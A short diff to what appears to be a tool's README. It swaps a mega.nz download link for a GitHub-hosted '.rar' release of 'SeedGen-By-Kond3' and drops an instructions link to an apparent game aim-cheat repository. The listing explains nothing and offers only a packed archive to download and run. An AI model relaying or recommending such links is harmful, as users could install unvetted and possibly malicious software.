@@ -1,6 +1,6 @@
-# Download - [!Click](https://mega.nz/file/MfUy2JqB#kZilLoQ3CLUanDaZypC3LTmZDIXj2qog3dHdSxsw7UI)
+# Download - [!Click](https://github.com/kond3ve1/SeedGen-By-Kond3/releases/download/1/Release.rar)
 
-# Instructions - [!click](https://github.com/kond3ve1/Deadlock-Kond3Aim/blob/main/Instructions.txt)
+
 
 # Features
 
